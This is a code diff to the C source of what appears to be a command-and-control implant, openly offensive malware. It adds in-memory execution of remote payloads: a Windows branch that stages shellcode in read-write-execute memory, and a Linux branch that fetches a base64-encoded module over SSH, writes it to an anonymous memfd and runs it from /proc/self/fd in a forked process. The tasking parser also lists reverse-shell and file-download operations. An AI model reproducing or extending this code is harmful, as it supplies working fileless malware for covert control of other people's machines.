@@ -1,5 +1,151 @@
 #include "agent.h"
 #include "config.h"
+#include "b64.h"
+
+// Agent in-memory execution definitions
+#ifdef _WIN32
+#define strncasecmp _strnicmp
+int exec_module(ssh_session session, char *module){
+	ULONG32 payload_size;
+    char * alloc_mem_ptr;
+    int i;
+    void (*func_ptr)();
+    
+    // Tests connection
+    //int sock_count = recv(remote_sock, (char *)&payload_size, 4, 0);
+    
+    //if (sock_count != 4 || payload_size <= 0) 
+      //  cleanup_sockets(remote_sock);
+    
+    alloc_mem_ptr = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    if (alloc_mem_ptr == NULL) 
+        return -1;
+        
+    alloc_mem_ptr[0] = 0xBF;
+    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
+    memcpy(alloc_mem_ptr + 1, &remote_sock, 4);
+
+	int rc=0;
+    int count=0;
+    void * startb = alloc_mem_ptr + 5;
+    while (count < payload_size) {
+        //rc = recv(sock, (char *)startb, size_of - count, 0);
+        startb += rc; 
+        count += rc;
+        if (rc == SOCKET_ERROR) 
+            return -1;
+    }
+
+    func_ptr = (void (*)())alloc_mem_ptr;
+    func_ptr();
+}
+#include <winsock.h>
+#else
+#define _GNU_SOURCE
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/wait.h>
+
+int do_exec(char *buff, int size){
+    pid_t child;
+
+// Create anon FD
+    int fd;
+    fd = memfd_create("", 1U); // MFD_CLOEXEC
+    write(fd, buff, size);
+    char *p;
+    asprintf(&p, "/proc/self/fd/%i", fd);
+    
+// fork to background
+    child = fork();
+    if (child == 0)
+    {
+        execlp(p, "example", NULL);
+        perror("execution error");
+        exit(EXIT_FAILURE);
+    }
+    else if (child == -1)
+    {
+        perror("fork");
+        exit(EXIT_FAILURE);
+    }
+
+// Wait and exit
+    waitpid(child, NULL, 0);
+    return 0;
+}
+
+int exec_module(ssh_channel channel, char *module){
+	int rc = 0;
+	int nbytes = 0;
+	char buffr[128];
+	
+	memset(buffr, 0, sizeof(buffr));
+	sprintf(buffr, "10%s", module);
+	
+	printf("Downloading module...\n");
+	rc = ssh_channel_write(channel, buffr, strlen(buffr));
+	if (rc == SSH_ERROR)
+  	{
+		printf("Write to channel failed\n");
+    	ssh_channel_close(channel);
+    	ssh_channel_free(channel);
+    	return rc;
+	}
+	
+	memset(buffr, 0, sizeof(buffr));
+	nbytes = ssh_channel_read(channel, buffr, sizeof(buffr), 0);
+	puts("Read Data from channel\n");
+	if (nbytes < 0){
+		printf("Caught read error from server...\n");
+    	ssh_channel_close(channel);
+    	ssh_channel_free(channel);
+    	return SSH_ERROR;
+	}	
+
+	printf("Received size: %s\n", buffr);
+	
+	rc = ssh_channel_write(channel, "0", 1);
+	printf("Wrote data to channel\n");
+	if (rc == SSH_ERROR){
+		printf("caught ssh error: %s\n", ssh_get_error(channel));
+		ssh_channel_close(channel);
+    	ssh_channel_free(channel);
+    	return rc;
+	}
+
+	int size = atoi(buffr);
+
+	char *buff = malloc(size);
+	memset(buff, 0, size);
+
+	printf("Getting executable contents with size %d\n", size);
+	rc = ssh_channel_read(channel, buff, size, 0);
+
+	printf("Decoding Data blob\n");
+	int finSize = b64_decoded_size(buff);
+	char *ptr = malloc(finSize);
+
+	if(!b64_decode(buff, (unsigned char *)ptr, finSize)){
+		printf("Decode failure\n");
+		return SSH_ERROR;
+	}
+
+	printf("Doing execution\n");
+	do_exec(ptr, size);
+	return 0;
+}
+#endif
+
+
+
+
+
 
 struct tasking_struct{
 	int operation;
@@ -122,14 +268,13 @@ int parse_tasking(char *tasking, ssh_channel chan){
 		i++;
 	}
 
-
-	printf("Initializing variables\n");
-
+	int rc = 0;
 	for(int j = 0; j < num; j++){
 		switch(tasking_arr[j].operation)
 		{
 		case AGENT_DOWN_FILE:
 			printf("Got tasking to download file %s\n", tasking_arr[j].opts);
+			//rc = download(tasking_arr[j].opts);
 			//ssh_channel_write(chan, )
 			break;
 		case AGENT_REV_SHELL:
@@ -143,6 +288,8 @@ int parse_tasking(char *tasking, ssh_channel chan){
 			break;
 		case AGENT_EXEC_MODULE:
 			printf("Got tasking to execute module %s\n", tasking_arr[j].opts);
+			rc = exec_module(chan, tasking_arr[j].opts);
+			
 			break;
 
 		case AGENT_EXIT:
